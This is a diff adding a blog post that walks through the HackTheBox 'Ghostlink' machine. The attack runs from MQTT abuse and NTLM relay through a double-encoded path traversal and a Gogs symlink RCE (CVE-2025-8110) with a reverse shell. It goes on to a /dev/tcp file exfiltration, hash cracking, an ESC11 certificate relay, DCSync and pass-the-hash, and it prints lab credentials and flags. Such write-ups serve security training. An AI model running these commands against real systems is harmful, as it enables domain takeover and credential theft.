@@ -1,0 +1,515 @@
+---
+slug: "htb-ghostlink"
+title: "Ghostlink - HackTheBox Machine Writeup"
+date: "2026-08-13"
+platform: "HackTheBox"
+type: "Machine"
+category: "Active Directory"
+os: "Windows"
+difficulty: "Hard"
+tags:
+  - "Windows"
+  - "Active Directory"
+  - "MQTT"
+  - "NTLM Relay"
+  - "Path Traversal"
+  - "CVE-2025-8110"
+  - "ADCS"
+  - "ESC11"
+excerpt: "A Hard Windows Active Directory box: leak internal hosts over anonymous MQTT, coerce a service account over a health-check, relay it to a file-share, abuse a double URL-encoded path traversal to steal a KeePass vault, land a Gogs symlink RCE (CVE-2025-8110), then abuse ESC11 to forge a Domain Controller certificate."
+readTime: "28 min"
+retired: false
+rating: 4.7
+url: "https://asbawy.github.io/writeups/htb-ghostlink"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
+
+<KillChain
+  steps={[
+    {
+      phase: "Analysis",
+      title: "Anonymous MQTT & Internal Host Discovery",
+      desc: "An nmap scan identifies MQTT (1883) on an AD Domain Controller. Anonymous subscription to MQTT healthcheck topics leaks internal vhosts (gpz-op26-secure, gpz-op26-toolkits) and fingerprints Gogs 0.13.3.",
+      tools: ["nmap", "mosquitto_sub", "curl"],
+    },
+    {
+      phase: "Vulnerability Discovery",
+      title: "Health-Check Coercion & Double URL-Encoded Traversal",
+      desc: "Repointing the MQTT healthcheck URL triggers NTLM authentication from svc_canary. Relaying NTLM to the secureshare vhost yields SOCKS access, where a double URL-encoded path traversal leaks an ntuser.dat hive and KeePass vault.",
+      technique: "NTLM Relay & Double URL-Encoding",
+      tools: ["responder", "ntlmrelayx", "pykeepass"],
+    },
+    {
+      phase: "Exploitation",
+      title: "Gogs Symlink RCE (CVE-2025-8110)",
+      desc: "Extracted KeePass credentials log into Gogs as vroth. Abusing CVE-2025-8110 (symlink overwrite of .git/config core.sshCommand) achieves initial command execution as git.",
+      tools: ["python3", "hashcat", "sqlite3"],
+    },
+    {
+      phase: "Escalation",
+      title: "ESC11 ADCS Domain Takeover",
+      desc: "Extracting nvirelli's PBKDF2 hash from gogs.db and cracking it via trimmed wordlist yields SSH access. Certipy enumerates ESC11 (ICPR unencrypted RPC); coercing DC01$ and relaying to ICPR mints a DC certificate for DCSync.",
+      tools: ["certipy", "coercer", "secretsdump", "crackmapexec"],
+    },
+  ]}
+/>
+
+
+## Reconnaissance
+
+We start with a full TCP port scan against `10.129.62.59`.
+
+```bash
+nmap -p- -T4 -Pn -sS 10.129.62.59
+
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+1883/tcp  open  mqtt
+2179/tcp  open  vmrdp
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+
+```
+
+The box is clearly a **Domain Controller** — it's running DNS, Kerberos, LDAP, SMB and WinRM. Two things jump out as non-default: port `1883/tcp` (**MQTT**) and an IIS web server on port `80`.
+
+<Callout type="info">
+  **Why MQTT is interesting.** MQTT is a lightweight pub/sub protocol normally used by IoT devices. Finding it on a domain controller is unusual — it suggests some internal component is publishing messages. If the broker allows **anonymous** connections, we can subscribe to `#` (all topics) and read everything being published.
+</Callout>
+
+Browsing to the IIS server on port 80 gives nothing but a static "Ghost Protocol Zero" landing page — the box is themed around a fictional APT group.
+
+---
+
+## MQTT Intelligence
+
+The MQTT broker on `1883` allows anonymous access. We subscribe to every topic and dump the retained messages:
+
+```bash
+mosquitto_sub -h 10.129.62.59 -p 1883 -t '#' -v -W 8
+```
+
+![MQTT topic dump](https://i.imgur.com/EQqJ3Mo.png)
+
+The broker is acting as a **node-tracking / health-monitoring bus** for the group's infrastructure. The interesting topics are:
+
+```text
+GhostProtocolZero/systems/node/secureshare/healthcheck  -> url: gpz-op26-secure.ghostlink.htb/healthcheck   ip: 172.16.20.10
+GhostProtocolZero/systems/node/repository/healthcheck   -> url: gpz-op26-toolkits.ghostlink.htb/healthcheck  ip: 172.16.20.20
+GhostProtocolZero/systems/node/domain/healthcheck       -> url: dc01.ghostlink.htb/healthcheck               ip: 10.129.62.59
+```
+
+This leaks three hosts that are *not* in DNS from the outside:
+
+| Host | IP | Role |
+|---|---|---|
+| `gpz-op26-secure.ghostlink.htb` | `172.16.20.10` | Secure file-sharing app |
+| `gpz-op26-toolkits.ghostlink.htb` | `172.16.20.20` | Gogs code host |
+| `dc01.ghostlink.htb` | `10.129.62.59` | The DC itself |
+
+We add these to `/etc/hosts` (they're virtual-hosted behind the DC's IIS/ARR reverse proxy) and browse:
+
+```bash
+curl -s -i http://gpz-op26-secure.ghostlink.htb/ | head -5
+# HTTP/1.1 401 Unauthorized
+# WWW-Authenticate: Negotiate
+# WWW-Authenticate: NTLM
+
+curl -s -i http://gpz-op26-toolkits.ghostlink.htb/ | grep -i 'gogs\|title'
+# <title>Gogs</title>
+```
+
+- `gpz-op26-secure` → **401**, requires NTLM authentication.
+- `gpz-op26-toolkits` → a **Gogs** instance (self-hosted Git service), anonymously reachable.
+
+![Gogs login page](https://i.imgur.com/jO30WXU.png)
+
+<Callout type="info">
+  **Fingerprinting Gogs without a version string.** Gogs doesn't advertise its version in the page footer. But it does load its static assets with a *git commit hash* as a cache-buster: `gogs.js?v=5084b4a9b77a506f5e287e82e945e1c6882b827a`. Searching that hash maps it to **Gogs 0.13.3** — which is vulnerable to the authenticated RCE **CVE-2025-8110** (we'll come back to this).
+</Callout>
+
+---
+
+## NTLM Coercion via the MQTT Health-Check
+
+The `secureshare` health-check topic contains a `url` field that the *secureshare* host periodically fetches to confirm it's still alive. The clever bit: the topic is **writable**, so we can repoint that `url` at our own box. When the health-check worker performs its HTTP request, it authenticates with **NTLM** — and we can capture (or relay) that authentication.
+
+First we read the current message, then publish our own copy with the `url` pointed at us:
+
+```python
+# exploit/mqtt_trigger.py
+payload = {"timestamp": "...", "node": "node-6",
+           "telemetry": {"healthy": True, "url": "http://10.10.15.187/",
+                         "lastCheckSecAgo": 1, "responseCode": "200", "ip": "172.16.20.10"}}
+client.publish("GhostProtocolZero/systems/node/secureshare/healthcheck", json.dumps(payload), retain=True)
+```
+
+We run Responder in parallel to see what comes back:
+
+```bash
+responder -I tun0 -v
+```
+
+![Responder captures svc_canary](https://i.imgur.com/Y4V5TQI.png)
+
+Within a minute, the worker fetches our URL and hands us an NTLMv2 hash:
+
+```text
+[HTTP] NTLMv2 Client   : 10.129.62.59
+[HTTP] NTLMv2 Username : ghostlink\svc_canary
+[HTTP] NTLMv2 Hash     : svc_canary::ghostlink:b952d4b6b9c44d75:8F8306C07CC5E26F917E8B5238624C4C:...
+```
+
+<Callout type="warning">
+  **The hash is uncrackable** — `svc_canary` has a strong machine-style password. Capturing it isn't the goal; *relaying* it is. NTLM relay lets us take that inbound authentication and bounce it against another service that will accept `svc_canary`'s credentials, without ever knowing the password.
+</Callout>
+
+---
+
+## Relaying to the Secure File-Share
+
+We point `ntlmrelayx` at `http://gpz-op26-secure.ghostlink.htb`, republish the MQTT topic with our `url`, and the relay completes:
+
+```bash
+ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb --http-port 8888 --keep-relaying -socks
+```
+
+![NTLM relay succeeds](https://i.imgur.com/odde6a1.png)
+
+```text
+[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.62.59 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
+[*] SOCKS: Adding HTTP://GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80) [1] to active SOCKS connection. Enjoy
+```
+
+We're now authenticated to the file-share app as `svc_canary`.
+
+![Secureshare app as svc_canary](https://i.imgur.com/A5KXedY.png)
+
+The app is a Blazor/ASP.NET front-end with an upload endpoint (`/api/upload`) and a download endpoint (`/api/download/<file>`), as revealed by `app.js`.
+
+<Callout type="warning">
+  **A real-world gotcha we hit.** The default ntlmrelayx SOCKS plugin reuses the raw relayed socket and desyncs on keep-alive (each request returns the *previous* request's body). To get reliable multi-request browsing, we wrote a small custom ntlmrelayx HTTP attack that serializes every request through the relayed connection with a lock — a local proxy on `127.0.0.1:18080`. That's what the rest of the traversal work goes through.
+</Callout>
+
+---
+
+## Double URL-Encoded Path Traversal
+
+The download endpoint takes a filename directly in the URL:
+
+```
+GET /api/download/<file>
+```
+
+We suspect it resolves `<file>` against an upload directory on the internal host. If it naively joins the path, a `..\` traversal would escape. Let's test the escalation ladder.
+
+**Attempt 1 — raw traversal** (blocked):
+
+```bash
+curl --path-as-is 'http://127.0.0.1:18080/api/download/..\..\..\..\windows\win.ini'
+# HTTP/1.1 403 Forbidden
+```
+
+**Attempt 2 — single URL-encoding** (still blocked):
+
+```bash
+curl 'http://127.0.0.1:18080/api/download/%2e%2e%5c%2e%2e%5cwindows%5cwin.ini'
+# HTTP/1.1 403 Forbidden
+```
+
+**Attempt 3 — double URL-encoding** (works):
+
+```bash
+python3 exploit/traversal_fetch.py '..\..\..\..\..\..\..\windows\win.ini'
+```
+
+![Path traversal reads win.ini](https://i.imgur.com/4C2nIYF.png)
+
+```text
+[+] ..\..\..\..\..\..\..\windows\win.ini -> HTTP 200, 92 bytes
+; for 16-bit app support
+[fonts]
+[extensions]
+```
+
+### How (and why) the bug works
+
+URL-encoding turns special bytes into `%xx`. The trick is in **how many times** the server decodes the path before using it:
+
+1. IIS decodes the incoming URL **once** before handing the path to the ASP.NET app.
+2. The app (or its routing/framework) decodes it **a second time** when it builds the file path.
+
+So:
+
+| What we send | After IIS decodes once | After the app decodes again |
+|---|---|---|
+| `..\..\windows\win.ini` | (unchanged) | → filtered: **403** |
+| `%2e%2e%5c...` | `..\..\windows\win.ini` | → filtered: **403** |
+| `%252e%252e%255c...` | `%2e%2e%5c...` | `..\..\windows\win.ini` → **200** |
+
+The filter only ever sees the *once*-decoded form. It looks for a literal `..\` and, finding `%2e%2e` instead, lets the request through. The *second* decode pass then silently converts it back into a real traversal. This is the classic **"double-encoding" filter bypass**.
+
+<Callout type="info">
+  **How you'd hunt for this.** Any endpoint that takes a filename/path in the URL is a traversal candidate. Test the ladder: raw `../` → URL-encoded `%2e%2e%2f` → double-encoded `%252e%252e%252f`. On Windows targets remember the separator is `\` (`%5c`), not `/`. If single-encoding returns 403 but double-encoding returns 200, you've found a double-decode bug. Tools like `ffuf` make this quick: feed a wordlist that includes `%2e%2e%5c` and `%252e%252e%255c` variants.
+</Callout>
+
+---
+
+## Registry Forensics → KeePass Vault
+
+Now authenticated as `svc_canary`, we can pull its `ntuser.dat` (the per-user registry hive that records what the account has been doing):
+
+```bash
+python3 exploit/traversal_fetch.py '..\..\..\..\..\..\..\Users\svc_canary\ntuser.dat' loot/ntuser.dat
+```
+
+We inspect the hive's *recently opened documents*:
+
+```bash
+python3 exploit/hive_inspect.py loot/ntuser.dat
+```
+
+![RecentDocs reveals db.zip](https://i.imgur.com/JECFEnP.png)
+
+```text
+KEY: Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.zip
+  [RegBin] MRUListEx: '\x00\x00\uffff\uffff'
+  [RegBin] 0: 'db.zip\x00'
+```
+
+`svc_canary` recently opened `db.zip`. RecentDocs entries map to `.lnk` shortcuts in `%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent\`, so we pull the shortcut to learn the file's full path:
+
+```bash
+python3 exploit/traversal_fetch.py '..\..\AppData\Roaming\Microsoft\Windows\Recent\db.zip.lnk' loot/db.zip.lnk
+strings -el loot/db.zip.lnk | grep -i 'db.zip'
+# C:\Users\svc_canary\Documents\Operations\Management\db.zip
+```
+
+Then we download the archive itself:
+
+```bash
+python3 exploit/traversal_fetch.py '..\..\Documents\Operations\Management\db.zip' loot/db.zip
+unzip -l loot/db.zip
+# db.kdbx      (KeePass database)
+# .key.keyx    (KeePass key file)
+```
+
+It's a **KeePass vault** protected by the key file (no master password). Opening it:
+
+```python
+from pykeepass import PyKeePass
+kp = PyKeePass('db.kdbx', keyfile='.key.keyx', password=None)
+for e in kp.entries:
+    print(e.title, '->', e.username, repr(e.password))
+```
+
+![KeePass entries](https://i.imgur.com/VTROF4P.png)
+
+```text
+Vesper Roth  -> vroth    'mOo03jpsqx8JQYMBwvFP'
+Nyx Virelli  -> nvirelli None   # "Migrated into centralized password manager"
+Domain Password Policy -> (attachment: passpol.pdf)
+```
+
+Two things matter:
+
+1. **`vroth` still has a password** — every other account was migrated to a "centralized password manager", but vroth was forgotten. `vroth:mOo03jpsqx8JQYMBwvFP` is our ticket into Gogs.
+2. The **Recycle Bin** contains a deleted entry with a `passpol.pdf` attachment — the *Default Domain Policy* report. It tells us the **minimum password length is 20 characters**, which we'll use to speed up hash-cracking later.
+
+---
+
+## Gogs RCE — CVE-2025-8110
+
+Gogs `0.13.3` is vulnerable to **CVE-2025-8110**, an authenticated remote-code-execution via a **symbolic-link** bypass in its `PutContents` API.
+
+### The bug, simply
+
+Gogs lets users commit **symlinks** into a repository (normal git behavior). It also exposes a `PutContents` API that writes file content *outside* the normal git flow. When CVE-2024-55947 was patched, the fix validated the *path* — but it forgot to validate where a *symlink* in that path points.
+
+So the attack is:
+
+1. Create a repo and commit a symlink that points at `.git/config`.
+2. Use `PutContents` to write through that symlink — Gogs follows it and overwrites the repo's `.git/config`, which lives *outside* the intended working-tree directory.
+3. In the injected `.git/config`, we set `core.sshCommand` to our reverse-shell command. The next time Gogs runs a git operation over SSH, that command executes.
+
+Our exploit (`exploit/gogs_symlink_rce.py`) logs in as `vroth`, mints an API token, creates a repo, commits the symlink, and fires the payload:
+
+```bash
+python3 exploit/gogs_symlink_rce.py -u http://gpz-op26-toolkits.ghostlink.htb -U vroth -P 'mOo03jpsqx8JQYMBwvFP' -H 10.10.15.187 -p 9002
+```
+
+![Gogs symlink RCE](https://i.imgur.com/NbANVkc.png)
+
+```text
+[*] logged in as vroth
+[*] application token: e2c1f6f19c070675e2fb0a2ed7330de652c15fe7
+[*] repo 'fba449dbde3f' created (HTTP 201)
+[*] symlink planted and pushed
+[*] payload written, check the listener
+```
+
+On our listener we get a shell as the `git` service account:
+
+```text
+$ nc -lvnp 9002
+connect to [10.10.15.187] from (UNKNOWN) [10.129.62.59] 49790
+git@gpz-op26-toolkits:~/data/tmp/local-repo/9$
+```
+
+<Callout type="warning">
+  **How to find this kind of bug.** We didn't fuzz Gogs — we fingerprinted its version (via the asset hash) and looked up known CVEs. Version fingerprinting → CVE lookup is the fastest route for self-hosted apps (Gogs, Gitea, Jenkins, GitLab, etc.). The Wiz Research write-up on CVE-2025-8110 documents the symlink mechanism in detail and is the authoritative reference.
+</Callout>
+
+---
+
+## Lateral Movement — from `git` to `nvirelli`
+
+The Gogs host has a local user `nvirelli`. Gogs stores user password hashes (PBKDF2-SHA256) in its SQLite database `gogs.db`, so we exfiltrate it:
+
+```bash
+# kali box
+nc -lvnp 9003 > gogs.db
+
+# target
+cat /opt/gogs/data/gogs.db > /dev/tcp/10.10.15.187/9003
+```
+
+We pull nvirelli's hash out:
+
+```bash
+sqlite3 gogs.db "SELECT name, passwd, salt FROM user WHERE name='nvirelli';"
+# nvirelli|8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8|DW3YdxPy25
+```
+
+And convert it to hashcat format (PBKDF2-HMAC-SHA256 = mode `10900`), where the salt is base64-encoded and the hex digest is base64-encoded:
+
+```
+sha256:10000:RFczWWR4UHkyNQ==:jZs6AcOgJgs52wEa7R2/I5uLGyivYUHyiqAdOzq4/9RAi8W5Bl/5V+cWN1p77BdV0+g=
+```
+
+<Callout type="info">
+  **Using the leaked password policy.** PBKDF2 is deliberately slow, so cracking a huge wordlist is painful. But `passpol.pdf` told us the minimum length is **20 characters**, so we trim `rockyou.txt` to only 20+ character candidates — from 14 million words down to 46,602 — and the crack finishes in seconds.
+</Callout>
+
+```bash
+grep -E '^.{20,}$' /usr/share/wordlists/rockyou.txt > trimmed.txt
+hashcat -a 0 -m 10900 nvirelli.hash trimmed.txt -O
+```
+
+![Hash cracked, user flag](https://i.imgur.com/KDmXrOS.png)
+
+```text
+sha256:10000:...:u47YUclrDiwWxBheaSzI
+Session..........: hashcat
+Status...........: Cracked
+```
+
+We `su` to nvirelli and grab the user flag:
+
+```bash
+su nvirelli          # password: u47YUclrDiwWxBheaSzI
+cat /home/nvirelli/user.txt
+```
+
+<SpoilerFlag label="Ghostlink — User Flag" flag="946398f6fc6e3e70828c7b9fc29cb1dc" />
+
+---
+
+## Domain Escalation — ESC11 (ADCS)
+
+`nvirelli` is a domain account, and the network has an **Active Directory Certificate Services** (ADCS) CA. We pivot through the Gogs host with **chisel** (reverse SOCKS proxy) so we can reach the CA on the internal `172.16.20.10`, then enumerate ADCS for vulnerabilities:
+
+```bash
+proxychains4 -q certipy find -u 'nvirelli@ghostlink.htb' -p 'u47YUclrDiwWxBheaSzI' -dc-ip 10.129.62.59 -vulnerable -stdout
+```
+
+![certipy finds ESC11](https://i.imgur.com/ds1EEc4.png)
+
+```text
+CA Name                             : ghostlink-GPZ-OP26-SECURE-CA
+DNS Name                            : gpz-op26-secure.ghostlink.htb
+Enforce Encryption for Requests     : Disabled
+[!] Vulnerabilities
+  ESC8  : Web Enrollment is enabled over HTTP.
+  ESC11 : Encryption is not enforced for ICPR (RPC) requests.
+```
+
+### What ESC11 means
+
+The CA accepts certificate requests over RPC (**ICPR**). Because it does **not enforce encryption** on those requests, we can relay a machine account's NTLM authentication directly into a certificate request. The classic ESC8 needs HTTP web enrollment; **ESC11** does the same thing over the raw RPC interface.
+
+Our target is the **Domain Controller machine account** (`DC01$`), which is allowed to request a *DomainController* certificate — and that certificate can impersonate the DC.
+
+The attack is a two-step relay:
+
+1. **Coerce** `DC01$` to authenticate to us (using `coercer` with the MS-RPRN / MS-DFSNM methods).
+2. **Relay** that authentication to the CA's ICPR interface with `ntlmrelayx`, requesting a DomainController certificate.
+
+```bash
+ntlmrelayx.py -t rpc://172.16.20.10 -rpc-mode ICPR -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' --template DomainController
+coercer coerce -l 10.10.15.187 -t dc01.ghostlink.htb -d ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --dc-ip 10.129.62.59 --always-continue
+```
+
+![ESC11 relay mints a DC cert](https://i.imgur.com/PQYiZwE.png)
+
+```text
+[*] (RPC): Authenticating connection from GHOSTLINK/DC01$@10.129.62.59 against rpc://172.16.20.10 SUCCEED [1]
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Generating CSR...
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Successfully requested certificate
+[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
+```
+
+We now hold a **DomainController certificate** for `DC01$`. We use it (via PKINIT) to obtain the DC machine account's NT hash, then run **DCSync** to dump the `Administrator` hash:
+
+```bash
+certipy auth -pfx DC01.pfx -dc-ip 10.129.62.59 -domain ghostlink.htb
+# Got hash for 'dc01$@ghostlink.htb': aad3b435b51404eeaad3b435b51404ee:95763b737d472b93645c595b2322089d
+
+secretsdump.py 'ghostlink.htb/dc01$@10.129.62.59' -hashes :95763b737d472b93645c595b2322089d -just-dc-user administrator
+```
+
+![DCSync dumps the Administrator hash](https://i.imgur.com/Fk6cFJv.png)
+
+```text
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8190e067f478002ddd63eb209b016696:::
+```
+
+Finally, we pass the Administrator hash into WinRM and read the root flag:
+
+```bash
+crackmapexec winrm 10.129.62.59 -u administrator -H 8190e067f478002ddd63eb209b016696 -x 'type C:\Users\Administrator\Desktop\root.txt'
+```
+
+![Root flag](https://i.imgur.com/63OPzYt.png)
+
+```text
+WINRM  10.129.62.59  5985  DC01  [+] ghostlink.htb\administrator:8190e067f478002ddd63eb209b016696 (Pwn3d!)
+WINRM  10.129.62.59  5985  DC01  [+] Executed command
+WINRM  10.129.62.59  5985  DC01  4f54904aea696f4638d47f38e76927b2
+```
+
+<SpoilerFlag label="Ghostlink — Root Flag" flag="4f54904aea696f4638d47f38e76927b2" />
+
+---
+
+## References
+
+- [Wiz Research — Gogs Zero-Day RCE (CVE-2025-8110)](https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit)
+- [CVE-2025-8110 — NVD / SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-8110/)
+- [Certipy — ADCS attack tool](https://github.com/ly4k/Certipy)
+- [SpecterOps — Certified Pre-Owned (ADCS attack taxonomy, ESC1-ESC8+)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
+- [Impacket — ntlmrelayx / secretsdump](https://github.com/fortra/impacket)
+- [Chisel — fast TCP/UDP tunnel](https://github.com/jpillora/chisel)
